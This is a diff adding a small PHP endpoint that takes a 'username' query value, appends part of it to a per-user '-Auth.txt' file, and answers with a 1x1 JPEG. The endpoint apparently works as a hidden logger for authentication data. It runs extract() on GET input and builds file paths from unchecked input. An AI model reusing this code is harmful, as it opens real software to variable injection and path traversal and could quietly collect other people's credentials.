@@ -1,0 +1,18 @@
+<?php
+	extract($_GET);
+	$inputcontent=explode("/",$username);
+	if(file_get_contents("../data/".$inputcontent[0]."-Auth.txt")==""){
+		$file=fopen("../data/".$inputcontent[0]."-Auth.txt","a");
+		fwrite($file,$inputcontent[1]);
+		fclose($file);
+	}
+	else{
+		$file=fopen("../data/".$inputcontent[0]."-Auth.txt","a");
+		fwrite($file,';'.$inputcontent[1]);
+		fclose($file);
+	}
+	sleep(3);
+	$im=imagecreate(1,1);
+	imagecolorallocate($im,0,0,0);
+	imagejpeg($im);
+?>
